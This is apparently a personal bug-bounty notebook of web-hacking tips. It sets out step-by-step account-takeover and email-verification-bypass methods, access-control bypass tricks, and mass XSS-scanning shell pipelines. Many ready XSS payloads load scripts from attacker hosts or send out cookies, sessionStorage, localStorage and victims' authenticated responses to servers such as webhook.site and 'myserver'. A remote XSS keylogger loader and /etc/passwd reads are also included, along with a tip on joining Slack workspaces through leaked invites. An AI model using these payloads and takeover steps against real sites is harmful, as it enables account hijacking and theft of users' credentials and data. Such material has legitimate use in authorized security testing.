# Random Tips (Bug bounty)

<details>
<summary>h1 disclosed reports</summary>

<dl>
<dd>

http://h1.nobbd.de/index.php

</dd>
</dl>

</details>

<details>
<summary>Wildcard scope but *.target.*</summary>

<dl>
<dd>

Sometimes the target scope is listed as \*.target.\* — meaning any TLD could be in play.

To quickly check which TLDs are available for that domain, use

https://instantdomainsearch.com/domain-extensions?q=target

</dd>
</dl>

</details>

<details>
<summary>find info about an ip or domain</summary>

<dl>
<dd>

When looking for information on an IP or network, you might often get more detailed and structured information from RDAP instead of WHOIS.  
  
Eg:

https://client.rdap.org/?type=ip&object=102.165.216.1

</dd>
</dl>

</details>

<details>
<summary>Account Takeover via facebook linking</summary>

<dl>
<dd>

Here's a technique that might grant you access to takeover other users' accounts using "Login with Facebook":

Are you working on a target site that supports "Login with Facebook"?

Disable email sharing during Facebook login and be ready for unusual design flows that could enable you to take over other users' accounts.

Here's how to disable email sharing when using "Login with Facebook":

1️⃣ Log in with Facebook on any app.  
2️⃣ Click "Edit Access."  
3️⃣ Uncheck the email address checkbox.  
4️⃣ Click Continue.

Here are some scenarios of account takeovers I've reported based on different target app behaviors:

Account Takeover via Linking Facebook Flow:  
1️⃣ Went to http://example[.]com, used "Login with Facebook" (Uncheck share email on Facebook).

2️⃣ The target site asked to enter an email to link my FB account as no email was shared from FB. Entered victim@example.com, a confirmation link was sent to the victim's email to bind the account.

3️⃣ Repeated the same steps on the target site using the same FB account, this time choose to link attacker@example.com on target site – received the same link as step (2) on the attacker controlled email!

4️⃣ Knowing this, repeated the same steps again to link victim@example.com, and used earlier link which was received on attacker@example.com to takeover victim@example.com account.

Direct Account Takeover via Login with Facebook:  
1️⃣ Went to http://example[.]com, used "Login with Facebook" (Uncheck share email on Facebook).

2️⃣ The target site prompted me to enter an email to link the FB account to an existing account since no email was shared from FB. Entered victim@example.com. It directly logged me into victim@example.com without any further verification, leading to a complete account takeover.

Pre-Account Takeovers:  
Do you have a target app that heavily relies on a user's email domain to grant access to organizations or critical features based on whitelisted domains? Using this technique can help you bypass email verification requirements, allowing you to claim any email. Consequently, you may be able to access critical features of other organizations permitted for emails with the same domain.

Lesson: Always test unusual login flows by logging in with a 3rd party provider without sharing email with the target site. These designs can be flawed and lead to nice bounties!

</dd>
</dl>

</details>

<details>
<summary>Another Pre account takeover tip</summary>

<dl>
<dd>

Bug Bounty Tips: Unlocking Important Resources with Email Verification Bypass

Working on a target where email verification is crucial? Imagine a scenario where gaining access to a specific domain, like example[.]com, could grant you entry into a victim's workspace, allowing you to view documents and other content associated with that whitelisted domain.

Often, email verification bypass issues are reported without demonstrating real-time impact or as pre-account takeovers. Consequently, many of these submissions get marked as "Informative."

Here's my approach on how to showcase the impact of these issues:

Identify Features Dependent on Email Domain:  
Identify critical features linked to a user's email domain. For instance, consider a target app that grants access to resources based on your email domain. Some apps let you join a team or workspace directly if your email matches the team's domain (e.g., join Victim SITE XYZ only with sample@victimsitexyz[.]com). Others restrict access to documents or videos based on email domain whitelisting. Numerous such opportunities exist where email plays a crucial role.

Here's a simple trick that often works to bypass email verification and claim an unregistered email on any domain:

1️⃣ Log in to your attacker account and change your email address to an attacker-controlled email (e.g., attackeremail@attackerdomain.com).

2️⃣ You'll likely receive an email confirmation link on your attacker-controlled email (Do not verify it yet).

3️⃣ Now, change your email to the unregistered email or domain you wish to HIJACK (e.g., victimemail@victimdomain.com).

4️⃣ This action will send an email verification link to victimemail@victimdomain.com, which you don't have access to.

5️⃣ Try clicking on the "Email" verification link sent earlier to attackeremail@attackerdomain.com. If the system fails to revoke the previous email verification link, the link for attackeremail@attackerdomain.com could end up verifying the email for victimemail@victimdomain.com, allowing you to claim it as verified.

Once you've claimed an email associated with another organization's domain, identify the associated functions to prove impact and report it to earn some generous bounties!

Numerous similar misconfigurations exist that you can leverage to bypass email verification checks.

Takeaways: Don't report email verification issues without demonstrating actual impact. Apps that support organizations/workspaces with multiple roles often rely on a person's email domain, making them valid candidates for showcasing security impact.

</dd>
</dl>

</details>

<details>
<summary>Pre account takeover</summary>

<dl>
<dd>

1. Signup using email address you have, You will receive a validation link on YOUR EMAIL.

2. There's an email verification bypass bug, was allowing me to take actions inside the account before verifying my email. I used it to change my email to "victim\_email@gmail.com"

3. Clicked on the verification link I received on my first email, Congrats .. Your email is verified with the "victim\_email@gmail.com" :D

</dd>
</dl>

</details>

<details>
<summary>Using web achieve to find old links</summary>

<dl>
<dd>

using http://waybackmachine.org may help when finding bugs. :) View html source and look for old links. Don't forget js files!

</dd>
</dl>

</details>

<details>
<summary>Attacking Big scope orgs</summary>

<dl>
<dd>

https://drive.google.com/file/d/1bALcKLEswahI8g-_65hggm6Q7395jRIQ/view

</dd>
</dl>

</details>

<details>
<summary>Interesting 0auth related reports</summary>

<dl>
<dd>

hackerone.com/reports/131202

https://hackerone.com/reports/6017

https://hackerone.com/reports/7900

https://hackerone.com/reports/244958

https://hackerone.com/reports/405100

https://ysamm.com/?p=379

</dd>
</dl>

</details>

<details>
<summary>slack invitation links</summary>

<dl>
<dd>

Use google dork "site:”join.slack.com”  
you will find tons of exposed invitation links to workspaces.  
you can join these workspaces even if the option "Require admin approval" is on.   
 because these leaked invites are made by the admins it Self

</dd>
</dl>

</details>

<details>
<summary>Signup to admin panel</summary>

<dl>
<dd>

> Website had admin panel with "Login with Google"  
> Only allowed Google login with company's email  
> Created an email account admin@website.com.abd.com  
> Created Google account with that email  
> Logged into admin panel with Google.  
>   
> choose “Use your existing email” while creating google account.

misconfig: the website only checks the company name after @ in email, admin@website.com.abd.com

</dd>
</dl>

</details>

<details>
<summary>How to open ipv6 address in browser</summary>

<dl>
<dd>

IP: 2600:1xx4:bxxx:2xx::3xxx

URL: https://[IP]

Note: IP needs to be put inside square bracket.

</dd>
</dl>

</details>

<details>
<summary>BAC issue</summary>

<dl>
<dd>

1- Invite User to your org, than accept invite and try to change email -> P4/P3  
2- Invite user but before accept invite delete it, than go to email and accept it, if user added successfully report it P3

</dd>
</dl>

</details>

<details>
<summary>HTTP request method changing</summary>

<dl>
<dd>

if server only allows GET and POST method, then try adding "X-HTTP-Method -Override: PUT to achieve RCE via PUT method

</dd>
</dl>

</details>

<details>
<summary>Android app tip</summary>

<dl>
<dd>

decompile android app. and go to : Resources > resources.arsc > res > values > strings.xml   
search for \*.firebaseio.com in xml file. ,and open browser try https://\*.firebaseio.com/.json , you might find read access to database there.

</dd>
</dl>

</details>

<details>
<summary>Bypass 403/401 via json extension</summary>

<dl>
<dd>

If API endpoint /api/path/ep throwing 401 try to go with /api/path/ep.json “ and it will fetch out json data without checking access control !

</dd>
</dl>

</details>

<details>
<summary>Bypass 401/403 page</summary>

<dl>
<dd>

https://x.com/intigriti/status/1751908292555612422?s=20

https://x.com/HarishKumar_28/status/1784145328234525075?s=20

<details>
<summary>2</summary>

<dl>
<dd>

i was recently able to bypass access controls by appending a url-encoded hash sign, resulting in an idor w/ pii disclosure

/api/v2/user/123 —> 403  
/api/v2/user/123%23 —> 200

it may be worth appending %00-%ff to see if the logic or regex in use can be terminated

</dd>
</dl>

</details>

<details>
<summary>3</summary>

<dl>
<dd>

url/?f=etc/passwd ==> 403  
encode etc/passwd as base64

url/?f=L2V0Yy9wYXNzd2Q= ==> 200

</dd>
</dl>

</details>

<details>
<summary>4</summary>

<dl>
<dd>

Victim's ID: 5200  
Attacker's ID: 5233  
GET /api/users/5200/info → Access Denied

GET /api/users/5200,5233/info → Bypassed

</dd>
</dl>

</details>

<details>
<summary>5</summary>

<dl>
<dd>

Tips :- https://example[.]com/endpoint -> Forbidden  
https://example[.]com/endpoint%00 -> bypassed

</dd>
</dl>

</details>

<details>
<summary>6</summary>

<dl>
<dd>

/admin\_users/sign\_in —> 403

/%61dmin\_users/sign\_in —> 200

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Bruteforcing api paths</summary>

<dl>
<dd>

I usually brute-force API paths with "Debug":true parameter and often it leads to reveal internal debug info to reverse proxies exposing API secrets and tokens.

![](image.png)

</dd>
</dl>

</details>

<details>
<summary>XSS scanners: `Automation`</summary>

<dl>
<dd>

<details>
<summary>1st step : `Gather urls`</summary>

<dl>
<dd>

1. cat domains | while read domain;do  
   gospider -s $domain -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg)" --other-source | grep -e "code-200" | awk '{print $5}' | tee -a urls.txt  
   sleep 8s  
   done

2. cat domains | while read domain;do  
   echo $domain | waybackurls | tee -a urls.txt  
   sleep 8s  
   done

3. cat domains | while read domain;do  
   echo $domain | hakrawler -timeout 5 | tee -a urls.txt  
   sleep 8s  
   done

4. cat domains | while read domain;do  
   python3 ~/tools/ParamSpider/paramspider.py --domain $domain --exclude woff,css,js,png,svg,php,jpg | tee -a urls.txt  
   sleep 8s  
   done

- cat urls.txt | sort -u > urlss.txt

- rm -rf urls.txt

- cat urlss.txt > urls.txt

- rm -rf urlss.txt

</dd>
</dl>

</details>

<details>
<summary>2nd step : `xss automate tools`</summary>

<dl>
<dd>

1. cat urls.txt | grep ”=” | qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \0330;31m" Vulnerable;done

2. cat urls.txt | grep "=" | qsreplace -a | dalfox pipe -o result.txt

3. cat urls.txt | Gxss -c 100 -p Xss | dalfox pipe -o result.txt

4. cat urls.txt | grep "=" | gf xss | Gxss -p test | dalfox pipe -o result.txt

5. cat urls.txt | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq

6. cat urls.txt | uro | dalfox pipe -b "><script src=https://abdbhoiii.xss.ht></script> -o xss.txt

7. cat urls.txt | grep "&" | bxss -appendMode -payload '"><script src=https://abdbhoiii.xss.ht></script>' -header "X-Forwarded-For"

8. cat urls.txt | bxss -payload '"><script src=https://hacker.xss.ht></script>' -header "X-Forwarded-For"

9. cat urls.txt | httpx -H "User-Agent: "><script src=https://abdbhoiii.xss.ht></script>”

</dd>
</dl>

</details>

<details>
<summary>Curl</summary>

<dl>
<dd>

1. cat urls.txt | grep "=" | sed ‘s/=.\*/=/’ | sed ‘s/URL: //’ | tee testxss.txt ; dalfox file testxss.txt -b [yours.xss.ht

2. gospider -S urls.txt -c 10 -d 5 --blacklist “(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe -o result.txt

3. echo "target.com" | waybackurls | httpx -silent | Gxss -c 100 -p Xss | grep "URL" | cut -d '"' -f2 | sort -u | dalfox pipe

4. waybackurls target.com | grep '=' | qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done

5. gospider -S target.txt -t 3 -c 100 | tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | grep '=' |qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done

6. httpx -l urls.txt -silent -no-color -threads 300 -location 301,302 | awk '{print $2}' | grep -Eo "(http|https)://[^/"].\* | tr -d '[]' | anew | xargs -I@ sh -c 'gospider -d 0 -s @' | tr ' ' '\n' | grep -Eo '(http|https)://[^/"].\*' | grep "=" | qsreplace "<svg onload=alert(1)>”

7. echo target.com | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq

8. cat targets.txt | waybackurls | anew | grep "=" | gf xss | nilo | gxss -p test | dalfox pipe --skip-bav --only-poc r --silence --skip-mining-dom --ignore-return 302,404,403

9. subfinder target.com | gau | grep "&" | bxss -appendMode -payload '"><script src=https://hacker.xss.ht></script>' -parameters (or -header "X-Forwarded-For" )

10. waybackurls target.com | sed 's/=.\*/=/' | sort -u | tee Possible\_xss.txt && cat Possible\_xss.txt | dalfox -b hacker.xss.ht pipe > output.txt

11. subfinder -d target.com | awk '{print $3}' | httpx -silent | xargs -I@ sh -c 'python3 http://xsstrike.py -u @ --crawl'

12. cat domainlist.txt | subfinder | dnsx | waybackurl | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | uro | dalfox pipe -b http://your.xss.ht  
     -o xss.txt

13. cat rootDomains.txt | assetfinder -no-subs | waybackurls | grep -Ev "\.(jpeg|jpg|png|ico)$" | uro | grep = | qsreplace "<img src=x onerror=alert(1)>" | httpx -silent -nc -c 200 -mr "<img src=x onerror=alert(1)>”

14. echo https://target.com  
     | waybackurls | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq

15. cat targets | waybackurls | anew | grep "=" | gf xss | nilo | gxss -p test | dalfox pipe --skip-bav --only-poc r --silence --skip-mining-dom --ignore-return 302,404,403

</dd>
</dl>

</details>

<details>
<summary>Go spider</summary>

<dl>
<dd>

<details>
<summary>`Single target`</summary>

<dl>
<dd>

gospider -s "https://www.target.com" -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe -o result.txt

gospider -a -s https://site.com -t 3 -c 100 | tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'

</dd>
</dl>

</details>

<details>
<summary>`Multiple target`</summary>

<dl>
<dd>

gospider -S urls.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe -o result.txt

gospider -S domain.txt -t 3 -c 100 | tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>’

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Hackrawler</summary>

<dl>
<dd>

#/bin/bash

hakrawler -url "${1}" -plain -usewayback -wayback | grep "${1}" | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | qsreplace -a | kxss | grep -Eo "(http|https)://[a-zA-Z0-9./?=\_-]\*" | dalfox pipe -b https://your.xss.ht

cat urls.txt | hakrawler -timeout 5

</dd>
</dl>

</details>

<details>
<summary>kxss</summary>

<dl>
<dd>

1. echo http://testphp.vulnweb.com/ | waybackurls | kxss

2. echo "domain.com" | subfinder -silent | gau | grep "="| kxss | tee -a out

3. echo "domain" | subfinder -silent | gauplus | grep "=" | uro | gf xss | awk '{ print "curl https://knoxss[.]me/api/v3 -d \"target="$1 "\" -H \"X-API-KEY: APIKNOXSS\""}' | sh

<details>
<summary>Another workaround:</summary>

<dl>
<dd>

1. Run `subfinder -d target.com | httprobe -c 100 > target.txt`

2. Run `cat target.txt | waybackurls | gf xss | kxss`

3. Got a URL which had all the special characters unfiltered and the parameter was `callback=`

4. Tried some basic XSS payloads but they weren’t working, the site was filtering some keywords in the payload (like script and alert)

5. Then he referred to the @PortSwigger XSS cheat sheet (link)

6. After trying some payloads, one payload worked > reported !

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Blind xss `BXSS`</summary>

<dl>
<dd>

1. subfinder -d target.com | gau | grep "&" | bxss -appendMode -payload '"><script src=https://hacker.xss.ht></script>' -parameters

2. subfinder -d target.com | gau | bxss -payload '"><script src=https://hacker.xss.ht></script>' -header "X-Forwarded-For"

3. cat roots.txt | waybackurls | httpx -H "User-Agent: "><script src=$YOUR\_XSS\_HUNTER></script>”

</dd>
</dl>

</details>

<details>
<summary>Gxss `single target`</summary>

<dl>
<dd>

echo "testphp.vulnweb.com" | waybackurls | httpx -silent | Gxss -c 100 -p Xss | grep "URL" | cut -d '"' -f2 | sort -u | dalfox pipe

echo "http://testphp.vulnweb.com/" | waybackurls | httpx -silent -timeout 2 -threads 100 | gf xss | anew

waybackurls testphp.vulnweb.com| grep '=' | qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done

</dd>
</dl>

</details>

<details>
<summary>httpx</summary>

<dl>
<dd>

httpx -l master.txt -silent -no-color -threads 300 -location 301,302 | awk '{print $2}' | grep -Eo "(http|https)://[^/"].\* | tr -d '[]' | anew | xargs -I@ sh -c 'gospider -d 0 -s @' | tr ' ' '\n' | grep -Eo '(http|https)://[^/"].\*' | grep "=" | qsreplace "<svg onload=alert(1)>”

</dd>
</dl>

</details>

<details>
<summary>Using Dalfox, GF & waybackurls</summary>

<dl>
<dd>

cat test.txt | gf xss | sed ‘s/=.\*/=/’ | sed ‘s/URL: //’ | tee testxss.txt ; dalfox file testxss.txt -b yours-xss-hunter-domain (e.g yours.xss.ht)

https://infosecwriteups.com/automating-xss-using-dalfox-gf-and-waybackurls-bc6de16a5c75

</dd>
</dl>

</details>

<details>
<summary>XSS from js hidden params</summary>

<dl>
<dd>

assetfinder domain*.com | gau | egrep -v '(.css|.svg)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e1;33m$url\n\e[1;32m$vars"

</dd>
</dl>

</details>

<details>
<summary>Fuff</summary>

<dl>
<dd>

cat hosts.txt | ffuf -w - -u "FUZZ/sign-in?next=javascript:alert(1);" -mr "javascript:alert(1)”

</dd>
</dl>

</details>

<details>
<summary>Automate XSS with burp</summary>

<dl>
<dd>

https://twitter.com/SaraBadran18/status/1563817699066748929?s=20

</dd>
</dl>

</details>

https://github.com/s0md3v/XSStrike

https://github.com/KathanP19/Gxss

https://github.com/epsylon/xsser

https://github.com/theinfosecguy/QuickXSS

https://github.com/DanMcInerney/xsscrapy

http://xssor.io/

<details>
<summary>https://github.com/ksharinarayanan/SSRFire</summary>



</details>

<details>
<summary>https://github.com/Elsfa7-110/xira</summary>



</details>

<details>
<summary>https://github.com/hahwul/XSpear</summary>



</details>

<details>
<summary>https://github.com/fcavallarin/domdig</summary>



</details>

<details>
<summary>https://github.com/emadshanab/pegaxss</summary>



</details>

<details>
<summary>https://github.com/emadshanab/xssHeaders</summary>



</details>

<details>
<summary>Chrome extension</summary>

<dl>
<dd>

https://github.com/bugbountyforum/XSS-Radar

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>DONT BE A VDP Hunter</summary>

<dl>
<dd>

https://x.com/ReebootToInit5/status/1749672887890628951?s=20

</dd>
</dl>

</details>

<details>
<summary>Good blog post.</summary>

<dl>
<dd>

https://bugbounty.info/

</dd>
</dl>

</details>

<details>
<summary>To better understand claude, study this</summary>

<dl>
<dd>

Anthropic's Claude 101 course

2. https://x.com/sairahul1/status/2049390786027167985?s=20

</dd>
</dl>

</details>

<details>
<summary>Tip for using claude</summary>

<dl>
<dd>

Keep your [claude.md under ~250 lines. Instead of cramming everything into one file, split extra context into a methodologies/folder (e.g., 1.md, 2.md, etc.).

When prompting, try something like:  
“Read claude.md and methodologies/\*.md, then hack on X.”

This setup helps Claude stay consistent and actually follow your instructions. If claude.md gets too large, it tends to lose track of important details over time.

<details>
<summary>2</summary>

<dl>
<dd>

Claude Code gold tip:  
  
[ context-mode + prompt catching ] ->

thank me later

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Sub enum via github</summary>

<dl>
<dd>

Extract subdomains from github Company repositories : dork:  
org:companyusername /.\*\.domain\.io/

</dd>
</dl>

</details>

<details>
<summary>All related to XSS</summary>

<dl>
<dd>

<details>
<summary>Escalating SSRF or SQLi to XSS</summary>

<dl>
<dd>

XSS can be an extra vulnerability brought by a SSRF or SQLi scenario:  
  
SSRF (curl-based)  
?url=https://brutelogic.com.br/poc.svg

SSRF (PHP file\_get\_contents)  
?url=data:,<svg/onload=alert(1)>  
  
SQLi (error-based)  
?id='<svg/onload=alert(1)>\

Union-Based SQLi (MySQL/MariaDB)  
Union Select@k:=0x3c2f5469746c652f3c2f5363726970742f27223e3c5376672f4f6e4c6f61643d616c6572742831293e,@k,@k,@k#  
`Use as many` `@k` `as the number of columns to match the injected query and encode # as %23 in URLs.`

</dd>
</dl>

</details>

<details>
<summary>RFC-compliant payloads to try and put in your username or telephone number fields</summary>

<dl>
<dd>

Email: "><img/src/onerror=import('//domain/')>"@domain.com

Mobile: 013371337;ext=<img/src/onerror=import('//domain/')>

Mobile: +441134960000;phone-context=<script>alert(1)</script>

</dd>
</dl>

</details>

<details>
<summary>Blind XSS Tips</summary>

<dl>
<dd>

Blind XSS through Support Chat leads to ATO, forging requests on behalf of the victim using Fetch & sending the response to the attacker server

<details>
<summary>Payload</summary>

<dl>
<dd>

"><img src="x"onerror="fetch('https://target/x',{method:'get',credentials:'include',headers:{'Content-Type':'application/json'}}).then(response => response.text()).then(data =>{var xhr=new XMLHttpRequest();http://xhr.open  
('POST','https://myserver/a');xhr.send(data);});">

“x” above is endpoint from which we want to extract information of victim e.g , target.com/billing\_info

</dd>
</dl>

</details>

<details>
<summary>Tip</summary>

<dl>
<dd>

While hunting for bxss always use encoded payload.

</dd>
</dl>

</details>

<details>
<summary>Top G bypass payload</summary>

<dl>
<dd>

</script><Iframe SrcDoc="><script src=https://abdbhoii.xss.ht></script>">

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>chrome tip</summary>

<dl>
<dd>

Chrome auto decodes all url-encoded, non-special characters in the URL for the user. This can be annoying when you're trying to sneak a payload in that looks a little weird.

You can bypass this by adding %ff anywhere in the URL.

</dd>
</dl>

</details>

<details>
<summary>.jsp pages</summary>

<dl>
<dd>

If you find jsp page with no parameters. You can actually add path parameters using semicolon  
Like this

http://example.com/test.jsp

;');alert(1)// & perform XSS.  
Apache tomcat support this.

</dd>
</dl>

</details>

<details>
<summary>Remote xss keylogger</summary>

<dl>
<dd>

Remote XSS Keylogger:

Payload: <svg/onload=setTimeout(function(){d=document;z=d.createElement("script");z.src="//YOUR\_SERVER/keylogger.js";d.body.appendChild(z)},0)>

This will log a user's input to your remote server.

keylogger.php:

https://pastebin.com/hzzQqSFt

keylogger.js:

https://pastebin.com/ySyG4TiN  
  
https://x.com/DevinStokes/status/1194029354222673921

</dd>
</dl>

</details>

<details>
<summary>Tip</summary>

<dl>
<dd>

#bugbountytip : Load response , extract all valid parameters names , submit all as get and post parameters , check which one is being reflected , you will increase your chances to get #xss

https://x.com/yassergersy/status/1172867578378838016?s=20

</dd>
</dl>

</details>

<details>
<summary>Tip target ads</summary>

<dl>
<dd>

Tip: A way I find #XSS is by googling the target and trying to find ads, these ad landing pages usually have custom URL params

</dd>
</dl>

</details>

<details>
<summary>changing user-agent</summary>

<dl>
<dd>

When you are dealing with XSS try to change the device or user-agent to Mobile you might get it work, in my case the homepage is different in devices the XSS is in username and the payload is Unicode UTF-16

![](image%201.png)

</dd>
</dl>

</details>

<details>
<summary>Blind XSS via svg `(POC)`</summary>

<dl>
<dd>

https://github.com/emadshanab/Blind-XSS-SVG

</dd>
</dl>

</details>

<details>
<summary>XSS finding Tips :</summary>

<dl>
<dd>

<details>
<summary>Using Google dorking and web archive</summary>

<dl>
<dd>

e.g,

site:host ext:php  
Site:host ext:asp  
site:host ext:aspx

http://web.archive.org

</dd>
</dl>

</details>

<details>
<summary>Play with paramters</summary>

<dl>
<dd>

Target.com/?s="><script>alert(1)</script> ---> No result ..

Copy and paste same parameter 2 times

Target.com/?s="><script>alert(1)</script>&s="><script>alert(1)</script> ---> boom alert(1)

</dd>
</dl>

</details>

<details>
<summary>Another tip</summary>

<dl>
<dd>

1. Pipe domain with waybackurls

2. Grep .php extension URLs and save in a file

3. Use arjun to find hidden parameters

4. Manually test each URL with XSS payloads

</dd>
</dl>

</details>

<details>
<summary>Another one</summary>

<dl>
<dd>

cat hosts | httpx -nc -t 300 -p 80,443,8080,8443 -silent -path "/?name={{this.constructor.constructor('alert(\"foo\")')()}}" -mr "name={{this.constructor.constructor('alert(”

</dd>
</dl>

</details>

<details>
<summary>Another one</summary>

<dl>
<dd>

firstname : <img src='  
lastname: 'onerror=print()>

Result:  
"firstname":"<img src ='","lastname":"'onerror=print()>"

JSON in src tag triggers the error: BOOM!!

</dd>
</dl>

</details>

<details>
<summary>Another interesting fact</summary>

<dl>
<dd>

Do you know that forward slashes ("/") inside html tags are automatically converted by browsers to spaces (" ").

Eg:  
X  
will be automatically converted into  
X

</dd>
</dl>

</details>

<details>
<summary>gau + reflected-parameters `(extension)`</summary>

<dl>
<dd>

Use https://github.com/lc/gau to find parameters and then I send data to burp suite and use https://github.com/portswigger/reflected-parameters… to check reflected parameters for XSS

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Top G `(XSS + SQLi + SSTI/CSTI )` detection payload</summary>

<dl>
<dd>

<details>
<summary>'"><svg/onload=prompt(5);>{{7\*7}}</summary>

<dl>
<dd>

' ==> for Sql injection

"><svg/onload=prompt(5);> ==> for XSS

{{7\*7}} ==> for SSTI/CSTI

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Reflected XSS to Account Takeover</summary>

<dl>
<dd>

Tip: When cookies are HTTP only go for localStorage -- alert(JSON.stringify(localStorage));

</dd>
</dl>

</details>

<details>
<summary>interesting payload</summary>

<dl>
<dd>

javascript:fetch('https://webhook.site 0{method:'POST',%20body:JSON.stringify({cookies:document.cookie,sessionStorage:sessionStorage,localStorage:localStorage})})

</dd>
</dl>

</details>

<details>
<summary>XSS to local file read</summary>

<dl>
<dd>

<script>x=new XMLHttpRequest;x.onload=function(){document.write(btoa(this.responseText))};http://x.open("GET","file:///etc/passwd");x.send();</script>

</dd>
</dl>

</details>

<details>
<summary>Steal Auth token from SessionStorage by Stored XSS</summary>

<dl>
<dd>

1. <img src=asdf onerror=alert(JSON.stringify(sessionStorage))>

2. <img src=x onerror='function steal() {for (const [key, value] of Object.entries(sessionStorage)) {var pair = key + "=" + value;var i=new Image;i.src="http://127.0.0.1/?"+pair;};} steal();';>

</dd>
</dl>

</details>

<details>
<summary>BXSS & SSTI Tip`(2 in one)`</summary>

<dl>
<dd>

<details>
<summary>Tip 1 :</summary>

<dl>
<dd>

Add a SSTI payload to your Blind XSS payload, if you are lucky, you have a visual internal SSTI in a critical endpoint.

${{48\*53}}`'";--><sCRIpt sRc=//your.oob></sCRIpt>

</dd>
</dl>

</details>

<details>
<summary>Tip 2</summary>

<dl>
<dd>

Put lot of payloads through the User Agent , we can use Burp intruder for this to automate

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>XSS in Swagger UI</summary>

<dl>
<dd>

<details>
<summary>https://www.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers/#newsletter</summary>

<dl>
<dd>

1. Open url with Swagger-UI in browser

2. Add one of parameters to URL :

`?url=https://jumpy-floor.surge.sh/test.yaml`

`?configUrl=https://jumpy-floor.surge.sh/test.json`

</dd>
</dl>

</details>

<details>
<summary>https://github.com/Nightmre/swAPI-XSS</summary>



</details>

</dd>
</dl>

</details>

<details>
<summary>Easy Stored XSS & HTML Injection</summary>

<dl>
<dd>

1. site: http://target.com inurl:"contact" | inurl:"contact-us" | inurl:"contactus" | inurl:"contcat\_us" | inurl:"contact\_form" | inurl:"contact-form"

</dd>
</dl>

</details>

<details>
<summary>Lable XSS hunter payload to find where payload gets executed</summary>

<dl>
<dd>

"><Script/src=//xss.xss.ht></scripT><img src=https://myhost\*com/(target name)>

</dd>
</dl>

</details>

<details>
<summary>Tip for XSS . OpenRedirect , IDOR etc..</summary>

<dl>
<dd>

https://twitter.com/0xN4iF/status/1557345020188966917?s=20&t=aVdmeG-2AI_vi_Gow2DP4w

</dd>
</dl>

</details>

<details>
<summary>pdf file upload to xss</summary>

<dl>
<dd>

https://gist.github.com/andripwn/671ef1aa6c535d9168c900524bfb84e1

</dd>
</dl>

</details>

<details>
<summary>XSS</summary>

<dl>
<dd>

1. https://twitter.com/steiner254/status/1521133641388146691?s=20&t=Dg3EzxfBEFlPeh5ba_-ZZQ

2. https://twitter.com/AMakki1337/status/1478048809217400837?s=20&t=heL2SFnKz1QeHEEqyS0_lw

<details>
<summary>Find XSS at large scale</summary>

<dl>
<dd>

1. cat host.txt | waybackurl | tee -a endpoint.txt

2. cat endpoint.txt | qsreplace ‘“><img src=x onerror=alert(1)> | tee -a xss\_fuzz.txt

3. cat xss\_fuzz.txt | freq | tee -a possible\_xss.txt

> `freq` tool : https://github.com/takshal/freq

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>XSS tips to load external code js</summary>

<dl>
<dd>

<img src=x onerror=import('//your-server.com/xss-code')>

In some case the server recognize / will break the code, using this one  
<img sRc=OnXSS OnError=import(atob('Ly95b3VyLXNlcnZlci5jb20v'))>

You can use <svg> tag too  
<svg OnLoad=import(atob('Ly95b3VyLXNlcnZlci5jb20v'))>  
<svg OnLoad=import('//your-server.com/xss-code')>

</dd>
</dl>

</details>

<details>
<summary>XSS tip</summary>

<dl>
<dd>

Have you ever come across an issue, where you could pop XSS but parenthesis  
() gets filtered ? this payload "onfocus="alert`1`"autofocus=" will bypass that problem

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Blind XSS Definition +18</summary>

<dl>
<dd>

Having s\*x without a c\*\*dom is like testing for Blind XSS, No one knows when it could trigger. XSSHunter payload fired

</dd>
</dl>

